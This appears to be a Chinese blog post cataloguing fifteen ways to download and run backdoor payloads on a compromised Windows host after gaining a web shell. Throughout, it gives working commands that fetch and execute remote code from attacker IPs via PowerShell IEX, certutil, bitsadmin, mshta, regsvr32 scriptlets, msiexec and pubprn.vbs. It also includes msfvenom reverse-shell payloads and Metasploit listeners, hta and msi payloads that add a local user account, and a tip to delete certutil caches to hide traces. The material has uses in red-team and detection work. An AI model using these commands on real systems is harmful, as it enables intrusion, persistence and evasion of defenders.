# Windows命令行下载文件方法


当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机**一般有两种方式：**

1. 远程下载文件到本地，然后再执行；

2. 远程下载执行，执行过程没有二进制文件落地（这种方式已然成为后门文件下载执行的首要方式）



**常见的下载方式**

- PowerShell
- Bitsadmin
- certutil
- wget
- ipc$文件共享
- FTP
- TFTP
- WinScp
- msiexec
- IEExec
- mshta
- rundll32
- regsvr32
- MSXSL.EXE
- pubprn.vbs





### 1.Powershell

远程下载文件保存在本地：

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.115/payload.txt','payload.exe')
```



远程执行命令：

```bash
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
```



### 2.Bitsadmin

bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。

```bash
bitsadmin /transfer n http://192.168.28.128/imag/evil.txt D:\1.txt
```



### 3.certutil

用于备份证书服务，支持xp-win10。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。

注：缓存目录为`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`

```bash
#下载文件 
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php 
#删除缓存 
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
```



### 4.wget

Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，然后使用wget下载文件。

下载地址：https://eternallybored.org/misc/wget/

```bash
wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
```



### 5.ipc$文件共享

IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

```bash
#建立远程IPC连接 
net use \\192.168.28.128\ipc$ /user:administrator "abc123!" 

#复制远程文件到本地主机 
copy \\192.168.28.128\c$\2.txt D:\test
```





### 6.FTP

一般情况下，攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

```bash
ftp 127.0.0.1 	# 这里换成我们装有payload的服务器的IP地址
username # 输入用户名
password 	# 密码
get file 	# 下载的payload文件
exit 
```





### 7.TFTP

用来下载远程文件的最简单的网络协议，它基于`UDP`协议而实现

tftp32服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html

```bash
tftp -i <你的payload的IP> get <要下载payload文件> <存放目标机器的目录位置>
```



### 8.WinScp

WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。

```bash
#上传 
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "put D:\1.txt /tmp/" "exit" /log=log_file.txt 

#下载 
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.tx
```



### 9.msiexec

msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：

```bash
#在攻击机器上生成msi包 
msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi 

#在目标机器上远程执行（直接写payload的ip和文件） 
msiexec /q /i http://192.168.28.128/evil.msi
```



### 10.IEExec

IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。

先在攻击机生成Payload：

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
```

使用管理员身份打开cmd，分别运行下面两条命令。

```bash
C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off

C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe
```





### 11.mshta

mshta用于执行`.hta`文件，而hta是`HTML Applocation`的缩写，也就是HTML应用程序。

而hta中也支持VBS。所以我们可以利用hta来下载文件。

**1.生成payload.hta**

run.hta内容如下：

```html
<HTML> 
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <HEAD> 
        <script language="VBScript"> 
            Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject("Wscript.Shell") objShell.Run "cmd.exe /c net user test password /add" // 这里填写命令 self.close 
        </script> 
        <body> demo </body> 
    </HEAD> 
</HTML>
```

或者参考这个文章生成hta:https://www.cnblogs.com/backlion/p/10491616.html

方法1：MSFVenom

```bash
# 先生成payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=121.36.37.235 lport=2222 -f hta-psh > shell.hta


# msf监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.109
set lport 1234
exploit

```

方法2：Metasploit

```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit


# 目标上
mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta
```



**2.然后再在目标机器执行前面生成的hta：**

```bash
mshta http://192.168.28.128/run.hta
```





### 12.rundll32

其实还是依赖于`WScript.shell`这个组件在这里我们使用`JSRat`来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序(项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git)。

1.开始运行JSRat，监听本地8888端口。

```bash
./JSRat.py -i 192.168.0.115 -p 8888
```

2.通过url访问，可以查看到恶意代码，复制上面生成的代码

3.在受害者PC运行该代码，将成功返回一个会话





### 13.regsvr32

Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行

在目标机上执行：

```bash
regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
# file.sct需要我们自己来构造
```

可以通过自己构造.sct文件中要执行的命令，去下载执行我们的程序(这里以弹计算器为例)：

```bash
<?XML version="1.0"?>
<scriptlet> 
    <registration progid="ShortJSRAT" classid="{10001111-0000-0000-0000-0000FEEDACDC}" > 
        <script language="JScript">
        <![CDATA[ ps = "cmd.exe /c calc.exe"; new ActiveXObject("WScript.Shell").Run(ps,0,true); ]]> 
        </script> 
    </registration> 
</scriptlet>
```



### 14.MSXSL.EXE

msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。

下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714

msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：

```bash
msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
```

demo.xml

```xml
<?xml version="1.0"?> 
<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
<customers> 
    <customer> 
 		<name>Microsoft</name>
    </customer>
</customers>
```

exec.xsl（这里以弹计算器为例）

```xml
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="JScript" implements-prefix="user"> 
    function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");   # 这里修改为我们要执行的命令
    return nodelist.nextNode().xml; }
</msxsl:script> 
<xsl:template match="/"> 
<xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```





### 15.pubprn.vbs

在Windows 7以上版本存在一个名为`PubPrn.vbs`的微软已签名WSH脚本，其位于`C:\Windows\System32\Printing_Admin_Scripts\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给`GetObject()`

```bash
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/xps/64acdkpodsk4566b04a/raw/a006a4 7e4075785016a62f7e5170ef36f5247cdb/test.sct
```

test.sct（和13一样，这里以弹计算器为例）

```xml
<?XML version="1.0"?> 
<scriptlet> 
<registration 
              description="Bandit" 
              progid="Bandit" 
              version="1.00" 
              classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}" 				                 remotable="true" >
</registration> 
<script language="JScript"> 
<![CDATA[ 
			var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 

]]> 
</script> 
</scriptlet>
```

















---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/  

